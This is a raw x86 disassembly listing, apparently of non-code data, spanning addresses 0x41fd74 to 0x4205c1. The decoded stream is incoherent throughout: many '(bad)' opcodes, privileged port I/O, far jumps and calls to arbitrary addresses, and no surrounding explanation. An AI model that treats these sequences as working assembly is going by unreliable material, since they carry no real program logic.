  41fd74:	fucomi st,st(4)
  41fd76:	fadd   st(3),st
  41fd78:	pop    es
  41fd79:	cmc    
  41fd7a:	fcmovu st,st(4)
  41fd7c:	icebp  
  41fd7d:	retf   
  41fd7e:	(bad)  
  41fd7f:	(bad)  
  41fd81:	(bad)  
  41fd82:	out    0xe2,eax
  41fd84:	lock call 0xe419b533
  41fd8a:	cmc    
  41fd8b:	mov    bh,0xf1
  41fd8d:	sar    DWORD PTR [edi-0x4a0e3754],cl
  41fd93:	in     eax,dx
  41fd94:	loopne 0x41fd94
  41fd96:	fld    st(6)
  41fd98:	int3   
  41fd99:	add    eax,0xc7c9e2c7
  41fd9e:	or     bl,cl
  41fda0:	sti    
  41fda1:	dec    BYTE PTR [ebx]
  41fda3:	or     al,0xe1
  41fda5:	shl    dl,0xc8
  41fda8:	lock div DWORD PTR [eax-0x5283f30]
  41fdaf:	repz into 
  41fdb1:	jmp    0x41fd68
  41fdb3:	mov    edx,0xd4e6bcf3
  41fdb8:	fcomp  st(1)
  41fdba:	or     al,BYTE PTR [ecx+eiz*8]
  41fdbd:	add    edi,edi
  41fdbf:	in     eax,0xec
  41fdc1:	int    0xcd
  41fdc3:	cld    
  41fdc4:	jecxz  0x41fd73
  41fdc6:	scas   al,BYTE PTR es:[edi]
  41fdc7:	icebp  
  41fdc8:	scas   eax,DWORD PTR es:[edi]
  41fdc9:	(bad)  
  41fdca:	out    dx,al
  41fdcb:	in     eax,0xb3
  41fdcd:	aad    0xd1
  41fdcf:	out    dx,al
  41fdd0:	jmp    0xba0eecb4
  41fdd5:	add    dl,ch
  41fdd7:	add    eax,0x6e6e6dd
  41fddc:	shl    ch,0xe8
  41fddf:	fdiv   st(1),st
  41fde1:	or     edi,edx
  41fde3:	adc    esp,ebx
  41fde5:	int3   
  41fde6:	icebp  
  41fde7:	test   bl,0xb4
  41fdea:	xlat   BYTE PTR ds:[ebx]
  41fdeb:	mov    cl,0xef
  41fded:	leave  
  41fdee:	(bad)  
  41fdef:	shl    ah,cl
  41fdf1:	mov    esp,0xcfe1e1df
  41fdf6:	rcr    ebp,cl
  41fdf8:	not    ah
  41fdfa:	shl    edx,0xff
  41fdfd:	push   es
  41fdfe:	fdivr  st,st(7)
  41fe00:	loop   0x41fe02
  41fe02:	add    al,0xf
  41fe04:	out    dx,eax
  41fe05:	out    0xdc,eax
  41fe07:	in     al,0xe0
  41fe09:	shr    BYTE PTR [edi+eax*8-0x27140407],0xfe
  41fe11:	enter  0xdfdb,0x1
  41fe15:	clc    
  41fe16:	mov    eax,0xf30bc507
  41fe1b:	out    0xc4,eax
  41fe1d:	cld    
  41fe1e:	jmp    0x41fe09
  41fe20:	add    ah,cl
  41fe22:	iret   
  41fe23:	in     eax,0xee
  41fe25:	fmul   st(1),st
  41fe27:	idiv   DWORD PTR [esp+ebp*4-0x7040537]
  41fe2e:	shl    ah,1
  41fe30:	mov    ebp,0xe9dcf6da
  41fe35:	fnstsw WORD PTR [ecx-0x34140505]
  41fe3b:	fsubrp st(6),st
  41fe3d:	or     eax,esp
  41fe3f:	fisttp WORD PTR [ebx]
  41fe41:	fdivp  st(0),st
  41fe43:	adc    DWORD PTR [edi-0x2c222229],edi
  41fe49:	(bad)  
  41fe4a:	(bad)  
  41fe4b:	shl    ebp,0xd9
  41fe4e:	iret   
  41fe4f:	in     eax,0xff
  41fe51:	iret   
  41fe52:	int3   
  41fe53:	loope  0x41fe35
  41fe55:	in     al,dx
  41fe56:	mov    ecx,0xe2d8ce
  41fe5b:	(bad)  
  41fe5d:	mov    ebp,0x113eff4
  41fe63:	shr    bl,cl
  41fe65:	fcomip st,st(1)
  41fe67:	out    dx,al
  41fe68:	(bad)  
  41fe69:	call   0xe83dd14e
  41fe6e:	sar    edi,1
  41fe70:	(bad)  
  41fe72:	ret    
  41fe73:	idiv   BYTE PTR [ecx-0x63c0b08]
  41fe79:	jecxz  0x41fe66
  41fe7b:	jmp    0xc406:0xefe8d6df
  41fe82:	psllw  mm2,mm2
  41fe85:	rcl    eax,cl
  41fe87:	mov    bl,0xcf
  41fe89:	sti    
  41fe8a:	test   eax,0xcec0d4bb
  41fe8f:	fcmovb st,st(5)
  41fe91:	(bad)  
  41fe92:	call   0x200df70
  41fe97:	ret    
  41fe98:	add    cl,bl
  41fe9a:	in     al,0xc2
  41fe9c:	fst    st(5)
  41fe9e:	ffreep st(0)
  41fea0:	mov    DWORD PTR [ecx],0xcce2fae1
  41fea6:	scas   eax,DWORD PTR es:[edi]
  41fea7:	retf   0xcce1
  41feaa:	icebp  
  41feab:	sar    BYTE PTR [ecx-0x2f493b],0xd3
  41feb2:	out    dx,al
  41feb3:	mov    ebx,0xd8f40203
  41feb8:	int3   
  41feb9:	loop   0x41febf
  41febb:	retf   
  41febc:	fadd   DWORD PTR ds:0xe3fac703
  41fec2:	std    
  41fec3:	fistp  QWORD PTR [ecx-0x2e524041]
  41fec9:	lock jmp 0xe8f7b689
  41fecf:	out    dx,al
  41fed0:	call   0xf02bbbc9
  41fed5:	sar    DWORD PTR [esi-0x1a411d06],1
  41fedb:	fimul  DWORD PTR [edx]
  41fedd:	mov    DWORD PTR [ebx],0x13c8d5cb
  41fee3:	fdivr  QWORD PTR [ebp-0x493b213a]
  41fee9:	mov    esp,0xf4d8f3c3
  41feee:	jmp    0xd125b6ec
  41fef3:	jecxz  0x41fec3
  41fef5:	mul    edx
  41fef7:	ret    0xece4
  41fefa:	test   bl,0xd9
  41fefd:	or     ch,al
  41feff:	loope  0x41feed
  41ff01:	jmp    0x41fee9
  41ff03:	cli    
  41ff04:	out    dx,eax
  41ff05:	int    0xaf
  41ff07:	into   
  41ff08:	out    0xee,eax
  41ff0a:	loope  0x41ff01
  41ff0c:	loopne 0x41fec9
  41ff0e:	mov    ch,0xd6
  41ff10:	mov    ebx,0xf4f1cade
  41ff15:	loop   0x41ff1d
  41ff17:	fiadd  WORD PTR [ecx]
  41ff19:	mov    edx,0xc204fad7
  41ff1e:	(bad)  
  41ff1f:	clc    
  41ff20:	into   
  41ff21:	out    dx,al
  41ff22:	(bad)  
  41ff23:	std    
  41ff24:	ror    esp,cl
  41ff26:	repz in al,0xe8
  41ff29:	retf   
  41ff2a:	mov    dl,0xda
  41ff2c:	mov    dh,0xf2
  41ff2e:	int    0xf2
  41ff30:	lds    esi,FWORD PTR [edx-0x8062a15]
  41ff36:	rcl    esp,0xd9
  41ff39:	cmc    
  41ff3a:	hlt    
  41ff3b:	fst    st(5)
  41ff3d:	test   dl,0xd
  41ff40:	or     esi,ebp
  41ff42:	or     DWORD PTR [ecx],edx
  41ff44:	(bad)  
  41ff45:	test   esp,0xcec5cab1
  41ff4b:	enter  0xb4ce,0xc9
  41ff4f:	fstp   st(2)
  41ff51:	enter  0xdef1,0xf7
  41ff55:	ret    
  41ff56:	aad    0xfa
  41ff58:	not    bh
  41ff5a:	fstp   st(7)
  41ff5c:	ror    BYTE PTR [eax],1
  41ff5e:	pop    es
  41ff5f:	add    al,0xd4
  41ff61:	push   es
  41ff62:	jmp    0x41ff47
  41ff64:	int    0xc4
  41ff66:	xlat   BYTE PTR ds:[ebx]
  41ff67:	mov    ebp,0xa8f7b5ab
  41ff6c:	out    0xc5,al
  41ff6e:	fidivr WORD PTR [ebx-0x2a474a23]
  41ff74:	xlat   BYTE PTR ds:[ebx]
  41ff75:	fidivr WORD PTR [edi-0x15fa3d4c]
  41ff7b:	aad    0xc9
  41ff7d:	loop   0x41ff44
  41ff7f:	stc    
  41ff80:	push   es
  41ff81:	loopne 0x41ff66
  41ff83:	into   
  41ff84:	shl    esp,0xcb
  41ff87:	mov    dl,0xc5
  41ff89:	hlt    
  41ff8a:	rcl    al,1
  41ff8c:	loopne 0x41ff81
  41ff8e:	cmc    
  41ff8f:	stc    
  41ff90:	mov    ebx,0xfdd5e9f0
  41ff95:	shl    DWORD PTR [ebp-0x3e0b3afa],1
  41ff9b:	retf   
  41ff9c:	sar    dh,1
  41ff9e:	out    0xfc,eax
  41ffa0:	in     al,dx
  41ffa1:	call   0xdf1ae585
  41ffa6:	fucom  st(3)
  41ffa8:	neg    ah
  41ffaa:	repnz xlat BYTE PTR ds:[ebx]
  41ffac:	mov    bl,0xcc
  41ffae:	mov    al,0xd2
  41ffb0:	(bad)  
  41ffb2:	fucomip st,st(4)
  41ffb4:	out    dx,al
  41ffb5:	ret    0xc2e1
  41ffb8:	in     al,0xfb
  41ffba:	rol    dh,1
  41ffbc:	aad    0xbe
  41ffbe:	add    eax,0xfee9dbe8
  41ffc3:	or     edi,DWORD PTR [esi-0x14362c2e]
  41ffc9:	fmul   st(3),st
  41ffcb:	repnz icebp 
  41ffcd:	jmp    0xf0d2:0xdcded4ee
  41ffd4:	dec    eax
  41ffd6:	(bad)  
  41ffd7:	rcl    dh,0xbd
  41ffda:	rol    DWORD PTR [eax],cl
  41ffdc:	fdivp  st(0),st
  41ffde:	fdivp  st(3),st
  41ffe0:	out    0xff,eax
  41ffe2:	fninit 
  41ffe4:	mov    esi,0xced6afc8
  41ffe9:	jmp    0x41ffb4
  41ffeb:	lods   al,BYTE PTR ds:[esi]
  41ffec:	mov    ebx,0xcdfdf4cb
  41fff1:	fsub   st,st(3)
  41fff3:	jecxz  0x41fff8
  41fff5:	ret    0xd5d1
  41fff8:	vcmpeqpd xmm2,xmm5,xmm0
  41fffd:	stc    
  41fffe:	imul   dl
  420000:	or     eax,ebx
  420002:	fdiv   st(5),st
  420004:	call   0xc32acdcc
  420009:	aad    0xa9
  42000b:	call   0xbf40b4df
  420010:	sti    
  420011:	iret   
  420012:	stc    
  420013:	sti    
  420014:	inc    cl
  420016:	out    0xd8,al
  420018:	int    0xeb
  42001a:	add    esi,eax
  42001c:	(bad)  
  42001d:	cmc    
  42001e:	add    DWORD PTR [edi],eax
  420020:	fmul   st(3),st
  420022:	(bad)  
  420024:	fldln2 
  420026:	loopne 0x41ffcc
  420028:	mov    bh,0xc5
  42002a:	lods   al,BYTE PTR ds:[esi]
  42002b:	fcmovu st,st(1)
  42002d:	mov    ch,0xe4
  42002f:	(bad)  
  420030:	mov    ch,0xf5
  420032:	fcomip st,st(1)
  420034:	jmp    0xe529c10d
  420039:	neg    ch
  42003b:	loopne 0x42001f
  42003d:	add    dl,ah
  42003f:	add    ebx,esp
  420041:	repz add BYTE PTR [edx],cl
  420044:	call   0xb22ecb18
  420049:	(bad)  
  42004a:	ror    dl,cl
  42004c:	mov    dl,0xf9
  42004e:	mov    edx,0xcfe3eab9
  420053:	sar    BYTE PTR [esi-0x1d3d290c],cl
  420059:	loope  0x420065
  42005b:	(bad)  
  42005c:	call   edi
  42005e:	fdivr  st(5),st
  420060:	aam    0xe1
  420062:	call   0xaa22ee4c
  420067:	(bad)  
  420069:	int    0xc4
  42006b:	retf   
  42006c:	out    0xe0,al
  42006e:	out    0xe4,eax
  420070:	imul   dl
  420072:	fdiv   st(0),st
  420074:	jecxz  0x42006a
  420076:	repz icebp 
  420078:	int3   
  420079:	(bad)  
  42007a:	(bad)  
  42007b:	xlat   BYTE PTR ds:[ebx]
  42007c:	call   0xf27e787
  420081:	psubd  mm2,mm2
  420084:	test   eax,0xc4e7aec5
  420089:	mov    ch,0xc5
  42008b:	sar    cl,0xb0
  42008e:	(bad)  
  420090:	out    dx,al
  420091:	mov    ebp,0xecb8f5d6
  420096:	fcmovnb st,st(0)
  420098:	xlat   BYTE PTR ds:[ebx]
  420099:	clc    
  42009a:	hlt    
  42009b:	add    ecx,DWORD PTR [eax]
  42009d:	clc    
  42009e:	enter  0xf40f,0xe0
  4200a2:	fcomp  st(0)
  4200a4:	out    dx,al
  4200a5:	repz shr ebp,cl
  4200a8:	(bad)
  4200ab:	lods   al,BYTE PTR ds:[esi]
  4200ac:	out    0xcd,al
  4200ae:	aam    0xe4
  4200b0:	fdivr  st(7),st
  4200b2:	aam    0xfa
  4200b4:	ret    
  4200b5:	add    edx,edx
  4200b7:	loop   0x420091
  4200b9:	add    cl,ah
  4200bb:	ret    0xd804
  4200be:	jmp    0x4200b9
  4200c0:	std    
  4200c1:	leave  
  4200c2:	int    0xc
  4200c4:	retf   
  4200c5:	lock (bad) 
  4200c7:	loop   0x4200af
  4200c9:	retf   0xe4d2
  4200cc:	mov    bl,0xd4
  4200ce:	(bad)  
  4200cf:	std    
  4200d0:	(bad)  
  4200d1:	stc    
  4200d2:	mov    esi,0xe3fff1d0
  4200d7:	aam    0x4
  4200d9:	cmc    
  4200da:	fadd   QWORD PTR [ecx+edi*8]
  4200dd:	fmul   st,st(0)
  4200df:	out    dx,al
  4200e0:	pop    es
  4200e1:	or     ebx,eax
  4200e3:	or     cl,ah
  4200e5:	out    0xc8,eax
  4200e7:	xlat   BYTE PTR ds:[ebx]
  4200e8:	int3   
  4200e9:	call   0xb71ae5e4
  4200ee:	(bad)  
  4200ef:	in     al,dx
  4200f0:	in     al,0xcc
  4200f2:	fcomip st,st(5)
  4200f4:	neg    bh
  4200f6:	into   
  4200f7:	repnz loope 0x4200f9
  4200fa:	pop    es
  4200fb:	faddp  st(1),st
  4200fd:	call   0xe72a03dd
  420102:	fdivr  st,st(0)
  420104:	shl    ecx,1
  420106:	(bad)  
  420107:	into   
  420108:	mov    bl,0xed
  42010a:	(bad)
  42010d:	out    0xf4,eax
  42010f:	fucomp st(6)
  420111:	push   eax
  420113:	add    ebx,ecx
  420115:	fiadd  WORD PTR [edi]
  420117:	fstp   TBYTE PTR [ebx+0x8e9d8dd]
  42011d:	out    0xc9,al
  42011f:	out    0xec,eax
  420121:	retf   
  420122:	enter  0xb9ec,0xcc
  420126:	(bad)  
  420127:	iret   
  420128:	mov    dh,0xbc
  42012a:	(bad)  
  42012c:	(bad)
  420130:	clc    
  420131:	icebp  
  420132:	int3   
  420133:	mov    ebp,0xbfb5c1cd
  420138:	icebp  
  420139:	fiadd  DWORD PTR [edi]
  42013b:	stc    
  42013c:	clc    
  42013d:	add    eax,0xe9c7ebee
  420142:	out    0xd9,al
  420144:	in     al,dx
  420145:	(bad)  
  420146:	repnz iret 
  420148:	sar    BYTE PTR [eax+edx*8-0xe2d1635],0xef
  420150:	sti    
  420151:	out    dx,al
  420152:	std    
  420153:	add    dl,bl
  420155:	into   
  420156:	repz add dl,bh
  420159:	rol    BYTE PTR [esi],0xd8
  42015c:	loop   0x420159
  42015e:	out    dx,al
  42015f:	call   0xdb1e0241
  420164:	out    0xc7,al
  420166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420167:	jmp    0xc6d9:0xb1c6d7e1
  42016e:	mov    al,0xd1
  420170:	mov    bh,0xca
  420172:	mov    eax,0xf1dcd3de
  420177:	fcmovnbe st,st(5)
  420179:	add    bl,al
  42017b:	fldl2t 
  42017d:	(bad)  
  42017f:	aam    0xb
  420181:	cli    
  420182:	add    ecx,ecx
  420184:	out    dx,al
  420185:	rol    dl,0xcc
  420188:	xlat   BYTE PTR ds:[ebx]
  420189:	sti    
  42018a:	jmp    0xeff2f375
  42018f:	repz idiv edi
  420192:	mov    edi,0xf6fbfcdd
  420197:	aad    0xec
  420199:	hlt    
  42019a:	fld    QWORD PTR [edx]
  42019c:	push   es
  42019d:	add    eax,esp
  42019f:	push   cs
  4201a0:	or     cl,BYTE PTR [eax]
  4201a2:	sti    
  4201a3:	in     eax,0xd8
  4201a5:	out    dx,al
  4201a6:	test   al,0xc2
  4201a8:	in     al,0xcf
  4201aa:	mov    ah,0xe0
  4201ac:	in     eax,dx
  4201ad:	neg    bh
  4201af:	shl    edi,cl
  4201b1:	int    0xf6
  4201b3:	fstp   st(1)
  4201b5:	shl    dh,cl
  4201b7:	in     eax,0xf1
  4201b9:	sti    
  4201ba:	(bad)  
  4201bb:	aam    0xd0
  4201bd:	fnstsw WORD PTR [ebp+0x706e0fa]
  4201c3:	(bad)  
  4201c4:	out    0xcf,eax
  4201c6:	jmp    0x42017a
  4201c8:	cmc    
  4201c9:	ret    
  4201ca:	into   
  4201cb:	(bad)
  4201ce:	mov    cl,0xf3
  4201d0:	jmp    0xd6f4:0xf6f9ffcf
  4201d7:	ret    0xc2d0
  4201da:	add    dh,dh
  4201dc:	add    ebx,edi
  4201de:	clc    
  4201df:	into   
  4201e0:	leave  
  4201e1:	(bad)  
  4201e3:	loopne 0x4201b8
  4201e5:	scas   al,BYTE PTR es:[edi]
  4201e6:	mov    bh,0xf1
  4201e8:	repnz sti 
  4201ea:	in     eax,0xce
  4201ec:	in     eax,0xec
  4201ee:	stc    
  4201ef:	int    0xbb
  4201f1:	mov    ebp,0xfdf8f1dc
  4201f6:	mov    esp,0xfdc703c6
  4201fb:	or     edx,esp
  4201fd:	add    esp,edi
  4201ff:	(bad)  
  420201:	add    eax,0xb1b8c4f8
  420206:	lock div esi
  420209:	rcl    esi,1
  42020b:	retf   
  42020c:	hlt    
  42020d:	mov    bh,0xf8
  42020f:	lock call 0xbb3a010f
  420215:	dec    bh
  420217:	aad    0xda
  420219:	in     eax,0xe4
  42021b:	pop    es
  42021c:	loop   0x42020e
  42021e:	fsub   st(7),st
  420220:	or     ah,ah
  420222:	push   cs
  420223:	int3   
  420224:	mov    eax,0xb3ccc0e5
  420229:	stos   BYTE PTR es:[edi],al
  42022a:	ret    0xbaa8
  42022d:	(bad)  
  42022e:	repnz out dx,al
  420230:	(bad)  
  420231:	mov    ah,0xf9
  420233:	cmc    
  420234:	mov    esi,0xe703cdf8
  420239:	stc    
  42023a:	shl    dh,0x8
  42023d:	cli    
  42023e:	or     edi,esp
  420240:	loope  0x42020e
  420242:	in     eax,0xeb
  420244:	mov    ebp,0xcee3c9cc
  420249:	aad    0xe0
  42024b:	jmp    0xf529f420
  420250:	rcr    bh,1
  420252:	cli    
  420253:	idiv   ecx
  420255:	ret    0xedc1
  420258:	ret    
  420259:	(bad)  
  42025a:	aad    0xca
  42025c:	jmp    0xf5070b38
  420261:	leave  
  420262:	retf   
  420263:	add    ah,al
  420265:	fsub   st,st(2)
  420267:	shl    ebp,cl
  420269:	lock mov ch,0xa8
  42026c:	mov    cl,0xf8
  42026e:	clc    
  42026f:	(bad)  
  420270:	(bad)  
  420272:	shr    eax,1
  420274:	mov    ebp,0xf9d8dfe3
  420279:	idiv   BYTE PTR [ebp+0xfe1ead5]
  42027f:	(bad)  
  420280:	(bad)  
  420282:	(bad)  
  420283:	cld    
  420284:	in     eax,dx
  420285:	(bad)  
  420287:	(bad)  
  420288:	rcr    bl,0xb6
  42028b:	xlat   BYTE PTR ds:[ebx]
  42028c:	mov    cl,0xb9
  42028e:	jmp    0x420285
  420290:	fdivp  st(3),st
  420292:	iret   
  420293:	ret    
  420294:	in     al,dx
  420295:	shl    ah,cl
  420297:	(bad)  
  420298:	in     eax,0xfe
  42029a:	aam    0xcb
  42029c:	add    ebx,esp
  42029e:	(bad)  
  42029f:	add    cl,ch
  4202a1:	or     DWORD PTR [eax],ecx
  4202a3:	cld    
  4202a4:	mov    dl,0xbd
  4202a6:	lods   eax,DWORD PTR ds:[esi]
  4202a7:	mov    dl,0xac
  4202a9:	out    dx,eax
  4202aa:	shl    DWORD PTR [edi-0x53343b51],0xbd
  4202b1:	not    dl
  4202b3:	clc    
  4202b4:	mov    edi,0xe201f301
  4202b9:	loope  0x420295
  4202bb:	(bad)  
  4202bc:	retf   
  4202bd:	jmp    0xc250fc8b
  4202c2:	retf   0xb9e9
  4202c5:	fidivr WORD PTR [esi-0x3a31153d]
  4202cb:	(bad)  
  4202cc:	iret   
  4202cd:	mov    ecx,0xc9d4d7fe
  4202d2:	call   0xf512e0a4
  4202d7:	mov    eax,0x5e6dbc6
  4202dc:	or     bh,ch
  4202de:	add    eax,0xdc05efc9
  4202e3:	add    eax,eax
  4202e5:	loop   0x4202ad
  4202e7:	mov    bl,0xcf
  4202e9:	leave  
  4202ea:	jmp    0x4202e7
  4202ec:	mov    cl,0xd8
  4202ee:	mov    dh,0xff
  4202f0:	jmp    0x4202e0
  4202f2:	fcmovu st,st(1)
  4202f4:	rol    DWORD PTR [edi],0xfa
  4202f7:	aam    0x1
  4202f9:	mov    ebp,0xa06e9f3
  4202fe:	push   cs
  4202ff:	sti    
  420300:	(bad)  
  420301:	or     bh,dh
  420303:	or     ecx,edx
  420305:	call   0xdc0ce0e1
  42030a:	jmp    0xcdb8:0xf4dff0cc
  420311:	into   
  420312:	mov    ah,0xcf
  420314:	rcr    edx,cl
  420316:	(bad)  
  420318:	mov    ebx,0xdd09f2bc
  42031d:	loope  0x420304
  42031f:	or     ebp,esi
  420321:	stc    
  420322:	loopne 0x420303
  420324:	out    0xc9,al
  420326:	shr    bh,1
  420328:	jmp    0xedae:0xbbf0f2c9
  42032f:	aam    0xdf
  420331:	(bad)  
  420333:	mov    esp,0xd6ffbfdd
  420338:	fcmovnu st,st(7)
  42033a:	aad    0xc0
  42033c:	cli    
  42033d:	dec    BYTE PTR [eax]
  42033f:	mov    esp,0xfaedfde7
  420344:	into   
  420345:	in     al,dx
  420346:	test   eax,0xe4f2c9c3
  42034b:	retf   0xd1b4
  42034e:	mul    esi
  420350:	(bad)  
  420351:	clc    
  420352:	cld    
  420353:	idiv   ebx
  420355:	in     al,dx
  420356:	sar    eax,0xd4
  420359:	out    0xd7,eax
  42035b:	fsubp  st(0),st
  42035d:	or     cl,cl
  42035f:	clc    
  420360:	jecxz  0x42033f
  420362:	ror    esp,0xac
  420365:	fucomip st,st(3)
  420367:	retf   0xf6d7
  42036a:	loopne 0x420340
  42036c:	scas   eax,DWORD PTR es:[edi]
  42036d:	(bad)  
  42036f:	mov    dh,0xee
  420371:	neg    ecx
  420373:	cmc    
  420374:	ret    
  420375:	shl    edx,1
  420377:	hlt    
  420378:	pop    es
  420379:	add    al,dl
  42037b:	(bad)  
  42037c:	fidivr WORD PTR [esi-0x62a2100]
  420382:	dec    BYTE PTR ds:0xcef0d3d2
  420388:	ret    0xc6f7
  42038b:	into   
  42038c:	(bad)  
  42038d:	mov    eax,0xe9f4beb1
  420392:	fcos   
  420394:	enter  0xf8ff,0xdb
  420398:	fdivr  st(5),st
  42039a:	clc    
  42039b:	jmp    0x42035f
  42039d:	add    eax,0xe0cdfbdd
  4203a2:	jmp    0xc6dc:0xf0e0e1e8
  4203a9:	(bad)  
  4203aa:	in     al,0xf1
  4203ac:	mov    ch,0xb4
  4203ae:	iret   
  4203af:	in     eax,dx
  4203b0:	shl    al,cl
  4203b2:	mov    edi,0xc7c1d2d0
  4203b7:	out    dx,al
  4203b8:	(bad)  
  4203b9:	rol    BYTE PTR [eax],0xdb
  4203bc:	fcmovb st,st(1)
  4203be:	std    
  4203bf:	neg    dl
  4203c1:	enter  0xdcf9,0xde
  4203c5:	lods   eax,DWORD PTR ds:[esi]
  4203c6:	in     al,dx
  4203c7:	mov    bh,0xb6
  4203c9:	mov    al,0xbb
  4203cb:	jmp    0x4203a1
  4203cd:	mov    al,0xc9
  4203cf:	(bad)  
  4203d0:	xlat   BYTE PTR ds:[ebx]
  4203d1:	hlt    
  4203d2:	repnz mov edx,0xfdb5f0b8
  4203d8:	not    esp
  4203da:	jecxz  0x4203b5
  4203dc:	out    0x8,eax
  4203de:	clc    
  4203df:	retf   
  4203e0:	push   cs
  4203e1:	std    
  4203e2:	fsubp  st(5),st
  4203e4:	jmp    0xe925e8b4
  4203e9:	jmp    0xbff1:0xb0b1b7c2
  4203f0:	mov    ebx,0xd2baccb5
  4203f5:	into   
  4203f6:	inc    BYTE PTR [ecx]
  4203f8:	stc    
  4203f9:	(bad)  
  4203fb:	retf   
  4203fc:	jecxz  0x4203db
  4203fe:	hlt    
  4203ff:	push   cs
  420400:	sti    
  420401:	in     eax,0xe8
  420403:	or     eax,0xd0cedcc0
  420408:	enter  0xf1f1,0xcf
  42040c:	xlat   BYTE PTR ds:[ebx]
  42040d:	call   0xdb35e3c3
  420412:	jmp    0x4203fe
  420414:	aam    0xcf
  420416:	pop    es
  420417:	mov    esi,0x5fffbbf
  42041c:	jecxz  0x4203ee
  42041e:	retf   0x107
  420421:	int3   
  420422:	ftst   
  420424:	iret   
  420425:	(bad)  
  420426:	out    0xe7,al
  420428:	shl    bh,cl
  42042a:	ror    ah,cl
  42042c:	shr    ecx,1
  42042e:	stc    
  42042f:	call   0xeafef108
  420434:	int    0xc0
  420436:	loope  0x42040e
  420438:	fiadd  DWORD PTR [eax]
  42043a:	shl    cl,cl
  42043c:	fld    DWORD PTR [ecx]
  42043e:	aad    0xf5
  420440:	or     dh,al
  420442:	sti    
  420443:	or     cl,bh
  420445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420446:	rcl    eax,0xb3
  420449:	shr    ebp,0xb4
  42044c:	fidivr DWORD PTR [eax-0x1c09172d]
  420452:	fidivr DWORD PTR [edi-0x26432f34]
  420458:	hlt    
  420459:	(bad)  
  42045b:	cli    
  42045c:	(bad)  
  42045d:	stc    
  42045e:	jmp    0xff3de440
  420463:	in     eax,dx
  420464:	rol    ch,1
  420466:	mov    cl,0xdd
  420468:	into   
  420469:	retf   0xf9b2
  42046c:	out    dx,al
  42046d:	mov    ah,0xf8
  42046f:	cli    
  420470:	jmp    0xdafae073
  420475:	add    ch,ch
  420477:	fucomp st(4)
  420479:	ret    
  42047a:	add    bl,cl
  42047c:	retf   
  42047d:	test   eax,0xcd00d8ee
  420483:	in     al,0xc6
  420485:	lods   eax,DWORD PTR ds:[esi]
  420486:	rcl    al,cl
  420488:	mov    bl,0xe2
  42048a:	mov    cl,0xed
  42048c:	int    0xb5
  42048e:	fsubrp st(5),st
  420490:	hlt    
  420491:	mov    ebx,0xd8bbbccf
  420496:	clc    
  420497:	inc    edi
  420499:	push   es
  42049a:	(bad)  
  42049b:	jmp    edx
  42049d:	fincstp 
  42049f:	cli    
  4204a0:	jecxz  0x42046b
  4204a2:	jecxz  0x4204a8
  4204a4:	mov    bl,0xbe
  4204a6:	mov    esp,0xadb0b6c5
  4204ab:	enter  0xfbd8,0xd4
  4204af:	jmp    0xda33f9b3
  4204b4:	not    al
  4204b6:	mov    esi,0x6f0cdf1
  4204bb:	add    bl,cl
  4204bd:	lock push es
  4204bf:	add    eax,0xefe20902
  4204c4:	scas   al,BYTE PTR es:[edi]
  4204c5:	repz sar DWORD PTR [esi-0x18393431],0xf4
  4204cd:	in     eax,dx
  4204ce:	mov    edx,0xd0bdd5ff
  4204d3:	(bad)  
  4204d4:	rcr    esp,1
  4204d6:	test   eax,0xdef104bd
  4204dc:	rol    dl,1
  4204de:	add    al,0xfb
  4204e0:	in     al,dx
  4204e1:	add    eax,0xcbedf8db
  4204e6:	in     al,0xb3
  4204e8:	loope  0x4204de
  4204ea:	sar    cl,0xeb
  4204ed:	out    dx,al
  4204ee:	in     al,dx
  4204ef:	aad    0xc8
  4204f1:	shl    bl,cl
  4204f3:	enter  0xf5cd,0xbf
  4204f7:	fcmovb st,st(1)
  4204f9:	mov    edx,0xc1f9daf1
  4204fe:	add    al,0xf5
  420500:	stc    
  420501:	(bad)  
  420502:	ror    edi,cl
  420504:	loop   0x4204b2
  420506:	out    dx,eax
  420507:	jecxz  0x4204d4
  420509:	scas   al,BYTE PTR es:[edi]
  42050a:	(bad)  
  42050c:	mov    ah,0xd2
  42050e:	mov    bh,0xd6
  420510:	mov    ah,0x3
  420512:	(bad)  
  420514:	add    bl,dl
  420516:	(bad)  
  420518:	cld    
  420519:	xlat   BYTE PTR ds:[ebx]
  42051a:	rol    BYTE PTR [eax],1
  42051c:	retf   
  42051d:	or     bl,al
  42051f:	pop    es
  420520:	ret    
  420521:	retf   
  420522:	cld    
  420523:	retf   
  420524:	out    0xd0,eax
  420526:	in     eax,dx
  420527:	out    dx,al
  420528:	lock mov dl,0xc6
  42052b:	enter  0xd4d7,0xb9
  42052f:	mov    al,0xbe
  420531:	retf   
  420532:	mov    edi,0xfefbdbf1
  420537:	aam    0xe2
  420539:	sti    
  42053a:	xlat   BYTE PTR ds:[ebx]
  42053b:	add    al,0xb
  42053d:	ffreep st(1)
  42053f:	fsub   st(4),st
  420541:	in     eax,0xe3
  420543:	out    0xde,eax
  420545:	ror    eax,cl
  420547:	int    0xe8
  420549:	hlt    
  42054a:	rcr    ebx,cl
  42054c:	(bad)  
  42054d:	int    0xc4
  42054f:	out    0xfc,al
  420551:	retf   0xf6cd
  420554:	xlat   BYTE PTR ds:[ebx]
  420555:	lock sar BYTE PTR [esi-0x16083c2b],1
  42055c:	loope  0x420567
  42055e:	clc    
  42055f:	into   
  420560:	(bad)  
  420561:	adc    esp,ebp
  420563:	fsubr  st(6),st
  420565:	fmul   st,st(3)
  420567:	in     eax,dx
  420568:	mov    dl,0xeb
  42056a:	iret   
  42056b:	in     al,0xea
  42056d:	in     eax,dx
  42056e:	ror    al,cl
  420570:	jmp    0x23df72b
  420575:	add    ah,dh
  420577:	int3   
  420578:	(bad)
  42057b:	jmp    0xe01eeb7a
  420580:	retf   0xa07
  420583:	(bad)  
  420584:	test   al,0xc0
  420586:	ret    
  420587:	loope  0x420534
  420589:	lds    esi,FWORD PTR [ecx-0x4b4a2646]
  42058f:	mov    eax,0x3effecb
  420594:	lock mov eax,0x6f500da
  42059a:	loop   0x420579
  42059c:	or     esi,edi
  42059e:	(bad)  
  4205a0:	add    ah,cl
  4205a2:	leave  
  4205a3:	jmp    0x420577
  4205a5:	(bad)  
  4205a7:	scas   al,BYTE PTR es:[edi]
  4205a8:	into   
  4205a9:	shr    DWORD PTR [ebp-0xe173619],0xb7
  4205b0:	fsubr  st,st(2)
  4205b2:	rcr    bh,1
  4205b4:	aad    0xda
  4205b6:	loopne 0x4205b2
  4205b8:	ret    
  4205b9:	lock add dl,dl
  4205bc:	loop   0x4205ba
  4205be:	cli    
  4205bf:	aam    0xc
  4205c1:	retf   0xe20f
